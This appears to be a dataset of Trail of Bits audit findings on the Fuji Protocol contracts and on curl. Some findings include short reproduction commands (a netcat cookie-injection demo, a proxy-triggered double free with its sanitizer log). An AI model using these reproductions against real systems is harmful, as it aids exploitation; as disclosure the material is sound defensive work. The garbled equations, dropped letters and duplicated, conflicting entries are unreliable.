FujiERC1155.sol#L266-268 This behavior does not adhere to the EIP-1155 specication, which states the following: Changes to the URI MUST emit the URI event if the change can be expressed with an event (i.e. it isnt dynamic/programmatic). Figure 9.2: A snippet of the EIP-1155 specication Recommendations Short term, revise the setURI function so that it emits the URI event. Long term, review the EIP-1155 specication to verify that the contracts adhere to the standard. References  EIP-1155 29 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "10. Partial renancing operations can break the protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper documents the Controller contracts ability to perform partial renancing operations. These operations move only a fraction of debt and collateral from one provider to another to prevent unprotable interest rate slippage. However, the protocol does not correctly support partial renancing situations in which debt and collateral are spread across multiple providers. For example, payback and withdrawal operations always interact with the current provider, which might not contain enough funds to execute these operations. Additionally, the interest rate indexes are computed only from the debt owed to the current provider, which might not accurately reect the interest rate across all providers. Exploit Scenario An executor performs a partial renancing operation. Interest rates are computed incorrectly, resulting in a loss of funds for either the users or the protocol. Recommendations Short term, disable partial renancing until the protocol supports it in all situations. Long term, ensure that functionality that is not fully supported by the protocol cannot be used by accident. 30 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "11. Native support for ether increases the codebases complexity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The protocol supports ERC20 tokens and Ethereums native currency, ether. Ether transfers follow dierent semantics than token transfers. As a result, many functions contain extra code, like the code shown in gure 11.1, to handle ether transfers. if (vAssets.borrowAsset == ETH) { require(msg.value >= amountToPayback, Errors.VL_AMOUNT_ERROR); if (msg.value > amountToPayback) { IERC20Upgradeable(vAssets.borrowAsset).univTransfer( payable(msg.sender), msg.value - amountToPayback ); } } else { // Check User Allowance require( IERC20Upgradeable(vAssets.borrowAsset).allowance(msg.sender, address(this)) >= amountToPayback, Errors.VL_MISSING_ERC20_ALLOWANCE ); Figure 11.1: FujiVault.sol#L319-333 This extra code increases the codebases complexity. Furthermore, functions will behave dierently depending on their arguments. Recommendations Short term, replace native support for ether with support for ERC20 WETH. This will decrease the complexity of the protocol and the likelihood of bugs. 31 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "12. Missing events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol 13. Indexes are not updated before all operations that require up-to-date indexes Severity: High Diculty: Low Type: Undened Behavior Finding ID: TOB-FUJI-013 Target: FujiVault.sol, FujiERC1155.sol, FLiquidator.sol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "14. No protection against missing index updates before operations that depend on up-to-date indexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. This function must be called before all operations that read indexes (TOB-FUJI-013). However, the protocol does not protect against situations in which indexes are not updated before they are read; these situations could result in incorrect accounting. Exploit Scenario Developer Bob adds a new operation that reads indexes, but he forgets to add a call to updateF1155Balances. As a result, the new operation uses outdated index values, which causes incorrect accounting. Recommendations Short term, redesign the index calculations so that they provide protection against the reading of outdated indexes. For example, the index calculation process could keep track of the last index updates block number and access indexes exclusively through a getter, which updates the index automatically, if it has not already been updated for the current block. Since ERC-1155s balanceOf and totalSupply functions do not allow side eects, this solution would require the use of dierent functions internally. Long term, use defensive coding practices to ensure that critical operations are always executed when required. 34 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "15. Formula for index calculation is unnecessarily complex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol 16. Flashers initiateFlashloan function does not revert on invalid ashnum values Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-FUJI-016 Target: Flasher.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "17. Docstrings do not reect functions implementations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The docstring of the FujiVault contracts withdraw function states the following: * @param _withdrawAmount: amount of collateral to withdraw * otherwise pass -1 to withdraw maximum amount possible of collateral (including safety factors) Figure 17.1: FujiVault.sol#L188-189 However, the maximum amount is withdrawn on any negative value, not only on a value of -1. A similar inconsistency between the docstring and the implementation exists in the FujiVault contracts payback function. Recommendations Short term, adjust the withdraw and payback functions docstrings or their implementations to make them match. Long term, ensure that docstrings always match the corresponding functions implementation. 38 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "18. Harvesters getHarvestTransaction function does not revert on invalid _farmProtocolNum and harvestType values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Harvester contracts getHarvestTransaction function incorrectly returns claimedToken and transaction values of 0 if the _farmProtocolNum parameter is set to a value greater than 1 or if the harvestType value is set to value greater than 2. However, the function does not revert on invalid _farmProtocolNum and harvestType values. function getHarvestTransaction(uint256 _farmProtocolNum, bytes memory _data) external view override returns (address claimedToken, Transaction memory transaction) { if (_farmProtocolNum == 0) { transaction.to = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimComp(address)\")), msg.sender ); claimedToken = 0xc00e94Cb662C3520282E6f5717214004A7f26888; } else if (_farmProtocolNum == 1) { uint256 harvestType = abi.decode(_data, (uint256)); if (harvestType == 0) { // claim (, address[] memory assets) = abi.decode(_data, (uint256, address[])); transaction.to = 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimRewards(address[],uint256,address)\")), assets, type(uint256).max, msg.sender ); } else if (harvestType == 1) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; transaction.data = abi.encodeWithSelector(bytes4(keccak256(\"cooldown()\"))); } else if (harvestType == 2) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; 39 Fuji Protocol transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"redeem(address,uint256)\")), msg.sender, type(uint256).max ); claimedToken = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; } } } Figure 18.1: Harvester.sol#L13-54 Exploit Scenario Alice, an executor of the Fuji Protocol, calls getHarvestTransaction with the _farmProtocolNum parameter set to 2. As a result, rather than reverting, the function returns claimedToken and transaction values of 0. Recommendations Short term, revise getHarvestTransaction so that it reverts if it is called with invalid farmProtocolNum or harvestType values. Long term, ensure that all functions revert if they are called with invalid values. 40 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "19. Lack of data validation in Controllers doRenancing function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Controller contracts doRefinancing function does not check the _newProvider value. Therefore, the function accepts invalid values for the _newProvider parameter. function doRefinancing( address _vaultAddr, address _newProvider, uint256 _ratioA, uint256 _ratioB, uint8 _flashNum ) external isValidVault(_vaultAddr) onlyOwnerOrExecutor { IVault vault = IVault(_vaultAddr); [...] [...] IVault(_vaultAddr).setActiveProvider(_newProvider); } Figure 19.1: Controller.sol#L44-84 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller.doRefinancing with the _newProvider parameter set to the same address as the active provider. As a result, unnecessary ash loan fees will be paid. Recommendations Short term, revise the doRefinancing function so that it reverts if _newProvider is set to the same address as the active provider. Long term, ensure that all functions revert if they are called with invalid values. 41 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Lack of data validation on function parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Certain setter functions fail to validate the addresses they receive as input. The following addresses are not validated:  The addresses passed to all setters in the FujiAdmin contract  The _newFujiAdmin address in the setFujiAdmin function in the Controller and FujiVault contracts  The _provider address in the FujiVault.setActiveProvider function  The _oracle address in the FujiVault.setOracle function  The _providers addresses in the FujiVault.setProviders function  The newOwner address in the transferOwnership function in the Claimable and ClaimableUpgradeable contracts Exploit scenario Alice, a member of the Fuji Protocol team, invokes the FujiVault.setOracle function and sets the oracle address as address(0). As a result, code relying on the oracle address is no longer functional. Recommendations Short term, add zero-value or contract existence checks to the functions listed above to ensure that users cannot accidentally set incorrect values, misconguring the protocol. Long term, use Slither, which will catch missing zero checks. 42 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "12. Missing events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. Indexes are not updated before all operations that require up-to-date indexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. However, this function is not called before all operations that read indexes. As a result, these operations use outdated indexes, which results in incorrect accounting and could make the protocol vulnerable to exploits. FujiVault.deposit calls FujiERC1155._mint, which reads indexes but does not call updateF1155Balances. FujiVault.paybackLiq calls FujiERC1155.balanceOf, which reads indexes but does not call updateF1155Balances. Exploit Scenario The indexes have not been updated in one day. User Bob deposits collateral into the FujiVault. Day-old indexes are used to compute Bobs scaled amount, causing Bob to gain interest for an additional day for free. Recommendations Short term, ensure that all operations that require up-to-date indexes rst call updateF1155Balances. Write tests for each function that depends on up-to-date indexes with assertions that fail if indexes are outdated. Long term, redesign the way indexes are accessed and updated such that a developer cannot simply forget to call updateF1155Balances. 33 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "15. Formula for index calculation is unnecessarily complex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "16. Flashers initiateFlashloan function does not revert on invalid ashnum values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Flasher contracts initiateFlashloan function does not initiate a ash loan or perform a renancing operation if the flashnum parameter is set to a value greater than 2. However, the function does not revert on invalid flashnum values. function initiateFlashloan(FlashLoan.Info calldata info, uint8 _flashnum) external isAuthorized { if (_flashnum == 0) { _initiateAaveFlashLoan(info); } else if (_flashnum == 1) { _initiateDyDxFlashLoan(info); } else if (_flashnum == 2) { _initiateCreamFlashLoan(info); } } Figure 16.1: Flasher.sol#L61-69 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller. doRefinancing with the flashnum parameter set to 3. As a result, no ash loan is initialized, and no renancing happens; only the active provider is changed. This results in unexpected behavior. For example, if a user wants to repay his debt after renancing, the operation will fail, as no debt is owed to the active provider. Recommendations Short term, revise initiateFlashloan so that it reverts when it is called with an invalid flashnum value. Long term, ensure that all functions revert if they are called with invalid values. 37 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "21. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Fuji Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Fuji Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 43 Fuji Protocol A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Bad recommendation in libcurl cookie documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The libcurl documentation recommends that, to enable the cookie store with a blank cookie database, the calling application should use the CURLOPT_COOKIEFILE option with a non-existing le name or plain  , as shown in gure 1.1. However, the former recommendationa non-blank lename with a target that does not existcan have unexpected results if a le by that name is unexpectedly present. Figure 1.1: The recommendation in libcurls documentation Exploit Scenario An inexperienced developer uses libcurl in his application, invoking the CURLOPT_COOKIEFILE option and hard-coding a lename that he thinks will never exist (e.g., a long random string), but which could potentially be created on the lesystem. An attacker reverse-engineers his program to determine the lename and path in question, and then uses a separate local le write vulnerability to inject cookies into the application. Recommendations Short term, remove the reference to a non-existing le name; mention only a blank string. Long term, avoid suggesting tricks such as this in documentation when a misuse or misunderstanding of them could result in side eects of which users may be unaware.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Libcurl URI parser accepts invalid characters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "According to RFC 3986 section 2.2, Reserved Characters, reserved = gen-delims / sub-delims gen-delims = \":\" / \"/\" / \"?\" / \"#\" / \"[\" / \"]\" / \"@\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.1: Reserved characters for URIs. Furthermore, the host eld of the URI is dened as follows: host = IP-literal / IPv4address / reg-name reg-name = *( unreserved / pct-encoded / sub-delims ) ... unreserved = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.2: Valid characters for the URI host eld However, cURL does not seem to strictly adhere to this format, as it accepts characters not included in the above. This behavior is present in both libcurl and the cURL binary. For instance, characters from the gen-delims set, and those not in the reg-name set, are accepted: $ curl -g \"http://foo[]bar\" # from gen-delims curl: (6) Could not resolve host: foo[]bar $ curl -g \"http://foo{}bar\" # outside of reg-name curl: (6) Could not resolve host: foo{}bar Figure 2.3: Valid characters for the URI host eld The exploitability and impact of this issue is not yet well understood; this may be deliberate behavior to account for currently unknown edge-cases or legacy support. Recommendations Short term, determine whether these characters are being allowed for compatibility reasons. If so, it is likely that nothing can be done; if not, however, make the URI parser stricter, rejecting characters that cannot appear in a valid URI as dened by RFC 3986. Long term, add fuzz tests for the URI parser that use forbidden or out-of-scope characters.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "3. libcurl Alt-Svc parser accepts invalid port numbers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Invalid port numbers in Alt-Svc headers, such as negative numbers, may be accepted by libcurl when presented by an HTTP server. libcurl uses the strtoul function to parse port numbers in Alt-Svc headers. This function will accept and parse negative numbers and represent them as unsigned integers without indicating an error. For example, when an HTTP server provides an invalid port number of -18446744073709543616, cURL parses the number as 8000: * Using HTTP2, server supports multiplexing * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x12d013600) > GET / HTTP/2 > Host: localhost:2443 > user-agent: curl/7.79.1 > accept: */* > < HTTP/2 200 < server: basic-h2-server/1.0 < content-length: 130 < content-type: application/json * Added alt-svc: localhost: 8000 over h3 < alt-svc: h3=\": -18446744073709543616 \" < Figure 3.1: Example cURL session Exploit Scenario A server operator wishes to target cURL clients and serve them alternative content. The operator includes a specially-crafted, invalid Alt-Svc header on the HTTP server responses, indicating that HTTP/3 is available on port -18446744073709543616 , an invalid, negative port number. When users connect to the HTTP server using standards-compliant HTTP client software, their clients ignore the invalid header. However, when users connect using cURL, it interprets the negative number as an unsigned integer and uses the resulting port number, 8000 , to upgrade the next connection to HTTP/3. The server operator hosts alternative content on this other port. Recommendations Short term, improve parsing and validation of Alt-Svc headers so that invalid port values are rejected. Long term, add fuzz and dierential tests to the Alt-Svc parsing code to detect non-standard behavior.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "4. Non-constant-time comparison of secrets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Several cases were discovered in which possibly user-supplied values are checked against a known secret using non-constant-time comparison. In cases where an attacker can accurately time how long it takes for the application to fail validation of submitted data that he controls, such behavior could leak information about the secret itself, allowing the attacker to brute-force it in linear time. In the example below, credentials are checked via Curl_safecmp() , which is a memory-safe, but not constant-time, wrapper around strcmp() . This is used to determine whether or not to reuse an existing TLS connection. #ifdef USE_TLS_SRP Curl_safecmp(data->username, needle->username) && Curl_safecmp(data->password, needle->password) && (data->authtype == needle->authtype) && #endif Figure 4.1: lib/url.c , lines 148 through 152. Credentials checked using a memory-safe, but not constant-time, wrapper around strcmp() The above is one example out of several cases found, all of which are noted above. Exploit Scenario An application uses a libcurl build with TLS-SRP enabled and allows multiple users to make TLS connections to a remote server. An attacker times how quickly cURL responds to his requests to create a connection, and thereby gradually works out the credentials associated with an existing connection. Eventually, he is able to submit a request with exactly the same SSL conguration such that another users existing connection is reused. Recommendations Short term, introduce a method, e.g. Curl_constcmp() , which does a constant-time comparison of two stringsthat is, it scans both strings exactly once in their entirety. Long term, compare secrets to user-submitted values using only constant-time algorithms.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Tab injection in cookie le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "When libcurl makes an HTTP request, the cookie jar le is overwritten to store the cookies, but the storage format uses tabs to separate key pieces of information. The cookie parsing code for HTTP headers strips the leading and trailing tabs from cookie keys and values, but it does not reject cookies with tabs inside the keys or values. In the snippet of lib/cookie.c below, Curl_cookie_add() parses tab-separated cookie data via strtok_r() and uses a switch-based state machine to interpret specic parts as key information: firstptr = strtok_r(lineptr, \"\\t\" , &tok_buf); /* tokenize it on the TAB */ Figure 5.1: Parsing tab-separated cookie data via strtok_r() Exploit Scenario A webpage returns a Set-Cookie header with a tab character in the cookie name. When a cookie le is saved from cURL for this page, the part of the name before the tab is taken as the key, and the part after the tab is taken as the value. The next time the cookie le is loaded, these two values will be used. % echo \"HTTP/1.1 200 OK\\r\\nSet-Cookie: foo\\tbar=\\r\\n\\r\\n\\r\\n\"|nc -l 8000 & % curl -v -c /tmp/cookies.txt http://localhost:8000 * Trying 127.0.0.1:8000... * Connected to localhost (127.0.0.1) port 8000 (#0) > GET / HTTP/1.1 > Host: localhost:8000 > User-Agent: curl/7.79.1 > Accept: */* * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK * Added cookie foo bar=\"\" for domain localhost, path /, expire 0 < Set-Cookie: foo bar= * no chunk, no close, no size. Assume close to signal end Figure 5.2: Sending a cookie with name foo\\tbar , and no value. % cat /tmp/cookies.txt | tail - localhost FALSE / FALSE 0 foo bar Figure 5.3: Sending a cookie with name foo\\tbar and no value Recommendations Short term, either reject any cookie with a tab in its key (as \\t is not a valid character for cookie keys, according to the relevant RFC), or escape or quote tab characters that appear in cookie keys. Long term, do not assume that external data will follow the intended specication. Always account for the presence of special characters in such inputs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Standard output/input/error may not be opened ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "The function main_checkfds() is used to ensure that le descriptors 0, 1, and 2 (stdin, stdout, and stderr) are open before curl starts to run. This is necessary to avoid the case wherein, if one of those descriptors fails to open initially, the next network socket opened by cURL may gain an FD number of 0, 1, or 2, resulting in what should be local input/output being received from or sent to a network socket instead. However, pipe errors actually result in the same outcome as success: static void main_checkfds ( void ) { #ifdef HAVE_PIPE int fd[ 2 ] = { STDIN_FILENO, STDIN_FILENO }; while (fd[ 0 ] == STDIN_FILENO || fd[ 0 ] == STDOUT_FILENO || fd[ 0 ] == STDERR_FILENO || fd[ 1 ] == STDIN_FILENO || fd[ 1 ] == STDOUT_FILENO || fd[ 1 ] == STDERR_FILENO) if (pipe(fd) < 0 ) return ; /* Out of handles. This isn't really a big problem now, but will be when we try to create a socket later. */ close(fd[ 0 ]); close(fd[ 1 ]); #endif } Figure 6.1: tool_main.c:83105 , lines 83 through 105 Though the comment notes that an out-of-handles condition would result in a failure later on in the application, there may be cases where this is not truee.g., the maximum number of handles has been reached at the time of this check, but handles are closed between it and the next attempt to create a socket. In such a case, execution might continue as normal, with stdin/out/err being redirected to an unexpected location. Recommendations Short term, use fcntl() to check if stdin/out/err are open. If they are not, exit the program if the pipe function fails. Long term, do not assume that execution will fail later; fail early in cases like these.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Double free when using HTTP proxy with specic protocols ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf", "body": "Using cURL with proxy connection and dict, gopher, LDAP, or telnet protocol triggers a double free vulnerability (gure 7.1). The connect_init function allocates a memory block for a connectdata struct (gure 7.2). After the connection, cURL frees the allocated buer in the conn_free function (gure 7.3), which is freed for the second time in the Curl_free_request_state frees, which uses the Curl_safefree function on elements of the Curl_easy struct (gure 7.4). This double free was also not detected in release builds during our testing  the glibc allocator checks may fail to detect such cases on some occasions. The two frees success indicates that future memory allocations made by the program will return the same pointer twice. This may enable exploitation of cURL if the allocated objects contain data controlled by an attacker. Additionally, if this vulnerability also triggers in libcurlwhich we believe it shouldit may enable the exploitation of programs that depend on libcurl. $ nc -l 1337 | echo 'test' & # Imitation of a proxy server using netcat $ curl -x http://test:test@127.0.0.1:1337 dict://127.0.0.1 2069694==ERROR: AddressSanitizer: attempting double-free on 0x617000000780 in thread T0: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf3afe in Curl_free_request_state curl/lib/url.c:2259:3 #2 0x7f1eeeaf3afe in Curl_close curl/lib/url.c:421:3 #3 0x7f1eeea30943 in curl_easy_cleanup curl/lib/easy.c:798:3 #4 0x4e07df in post_per_transfer curl/src/tool_operate.c:656:3 #5 0x4dee58 in serial_transfers curl/src/tool_operate.c:2434:18 #6 0x4dee58 in run_all_transfers curl/src/tool_operate.c:2620:16 #7 0x4dee58 in operate curl/src/tool_operate.c:2732:18 #8 0x4dcf73 in main curl/src/tool_main.c:276:14 #9 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #10 0x41c7cd in _start (curl/src/.libs/curl+0x41c7cd) 0x617000000780 is located 0 bytes inside of 664-byte region [0x617000000780,0x617000000a18) freed by thread T0 here: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf6094 in conn_free curl/lib/url.c:814:3 #2 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684: #3 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #4 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #5 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #6 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #7 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #8 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #9 0x4dcf73 in main curl/src/tool_main.c:276:14 #10 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 previously allocated by thread T0 here: #0 0x495082 in calloc (curl/src/.libs/curl+0x495082) #1 0x7f1eeea6d642 in connect_init curl/lib/http_proxy.c:174:9 #2 0x7f1eeea6d642 in Curl_proxyCONNECT curl/lib/http_proxy.c:1061:14 #3 0x7f1eeea6d1f2 in Curl_proxy_connect curl/lib/http_proxy.c:118:14 #4 0x7f1eeea94c33 in multi_runsingle curl/lib/multi.c:2028:16 #5 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684:14 #6 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #7 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #8 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #9 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #10 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #11 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #12 0x4dcf73 in main curl/src/tool_main.c:276:14 #13 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: double-free (curl/src/.libs/curl+0x494c8d) in free Figure 7.1: Reproducing double free vulnerability with ASAN log 158 static CURLcode connect_init ( struct Curl_easy *data, bool reinit) // (...) 174 s = calloc( 1 , sizeof ( struct http_connect_state )); Figure 7.2: Allocating a block of memory that is freed twice ( curl/lib/http_proxy.c#158174 ) 787 static void conn_free 